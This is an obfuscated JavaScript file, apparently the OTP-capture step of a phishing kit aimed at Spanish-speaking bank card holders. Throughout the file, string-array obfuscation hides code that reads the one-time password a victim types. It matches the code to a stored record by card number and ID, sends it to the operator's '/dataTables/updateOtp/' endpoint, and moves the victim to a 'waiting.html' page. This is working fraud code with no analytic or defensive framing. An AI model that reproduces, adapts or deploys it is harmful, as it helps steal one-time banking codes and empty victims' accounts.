const _0x989283 = _0x3e82;
(function (_0x28a579, _0x344872) {
  const _0x5c802c = _0x3e82,
    _0xe61a73 = _0x28a579();
  while (!![]) {
    try {
      const _0x524c02 =
        parseInt(_0x5c802c(0x146)) / 0x1 +
        -parseInt(_0x5c802c(0x150)) / 0x2 +
        (-parseInt(_0x5c802c(0x14d)) / 0x3) *
          (parseInt(_0x5c802c(0x144)) / 0x4) +
        (parseInt(_0x5c802c(0x152)) / 0x5) *
          (parseInt(_0x5c802c(0x157)) / 0x6) +
        parseInt(_0x5c802c(0x13d)) / 0x7 +
        (parseInt(_0x5c802c(0x141)) / 0x8) *
          (parseInt(_0x5c802c(0x135)) / 0x9) +
        (parseInt(_0x5c802c(0x145)) / 0xa) *
          (-parseInt(_0x5c802c(0x147)) / 0xb);
      if (_0x524c02 === _0x344872) break;
      else _0xe61a73["push"](_0xe61a73["shift"]());
    } catch (_0x4fd1c8) {
      _0xe61a73["push"](_0xe61a73["shift"]());
    }
  }
})(_0x22b7, 0xbfbb3),
  document["getElementById"](_0x989283(0x14c))[_0x989283(0x143)](
    _0x989283(0x151),
    function (_0x386cfe) {
      const _0x38c664 = _0x989283;
      _0x386cfe["preventDefault"]();
      var _0x29d9be = document[_0x38c664(0x139)](_0x38c664(0x14f))[
        _0x38c664(0x155)
      ];
      console[_0x38c664(0x158)](_0x29d9be);
      var _0x34f4c1 = document["getElementById"]("form"),
        _0x163648 = _0x34f4c1[_0x38c664(0x153)]("input[required]"),
        _0x5dfc81 = Array[_0x38c664(0x13a)](_0x163648)[_0x38c664(0x137)](
          (_0x21623e) => _0x21623e[_0x38c664(0x155)][_0x38c664(0x13c)]() !== ""
        );
      if (!_0x5dfc81) {
        var _0x2c1967 = document[_0x38c664(0x139)](_0x38c664(0x13e));
        (_0x2c1967["textContent"] = _0x38c664(0x156)),
          (_0x2c1967[_0x38c664(0x136)]["display"] = "block"),
          setTimeout(function () {
            const _0x293789 = _0x38c664;
            _0x2c1967[_0x293789(0x136)][_0x293789(0x140)] = "none";
          }, 0x7d0);
      } else {
        async function _0x195f15() {
          const _0x3bfb2d = _0x38c664,
            _0x2dc2d6 = await fetch(url + _0x3bfb2d(0x13f), {
              method: _0x3bfb2d(0x142),
              headers: { "Content-Type": _0x3bfb2d(0x13b) },
            }),
            _0x7f33c8 = await _0x2dc2d6["json"](),
            _0x1aee70 = [..._0x7f33c8];
          for (const _0x590915 of _0x1aee70) {
            if (
              _0x590915["tarjeta"] == info[_0x3bfb2d(0x14b)]["p"] &&
              _0x590915["id"] == info[_0x3bfb2d(0x14b)]["cc"]
            ) {
              console[_0x3bfb2d(0x158)](_0x3bfb2d(0x14e));
              const _0x2e9132 = await fetch(
                  url + _0x3bfb2d(0x148) + _0x590915[_0x3bfb2d(0x154)],
                  {
                    method: "PUT",
                    headers: { "Content-Type": "application/json" },
                    body: JSON[_0x3bfb2d(0x159)]({ otp: _0x29d9be }),
                  }
                ),
                _0x5d6761 = await _0x2e9132[_0x3bfb2d(0x149)]();
            }
          }
          window["location"][_0x3bfb2d(0x138)] = _0x3bfb2d(0x14a);
        }
        _0x195f15();
      }
    }
  );
function _0x3e82(_0x1fe0b3, _0x16a0d0) {
  const _0x22b7a5 = _0x22b7();
  return (
    (_0x3e82 = function (_0x3e827c, _0x1ef5e8) {
      _0x3e827c = _0x3e827c - 0x135;
      let _0x1edd41 = _0x22b7a5[_0x3e827c];
      return _0x1edd41;
    }),
    _0x3e82(_0x1fe0b3, _0x16a0d0)
  );
}
function _0x22b7() {
  const _0x1c46a7 = [
    "1220013OuLTvF",
    "style",
    "every",
    "href",
    "getElementById",
    "from",
    "application/json",
    "trim",
    "7280126kRRiuP",
    "error-message",
    "/dataTables/dataTables",
    "display",
    "56ijbpDW",
    "GET",
    "addEventListener",
    "8JHCeGh",
    "12714110JzgFEL",
    "649473NfgImX",
    "11cpnrIs",
    "/dataTables/updateOtp/",
    "json",
    "waiting.html",
    "metaInfo",
    "btnNextStep",
    "818709JqGUTE",
    "Usuario\x20Encontrado",
    "otp",
    "728332Uvvfud",
    "click",
    "1580YiGIsq",
    "querySelectorAll",
    "idreg",
    "value",
    "Todos\x20los\x20campos\x20son\x20obligatorios.",
    "6234JcEwCH",
    "log",
    "stringify",
  ];
  _0x22b7 = function () {
    return _0x1c46a7;
  };
  return _0x22b7();
}
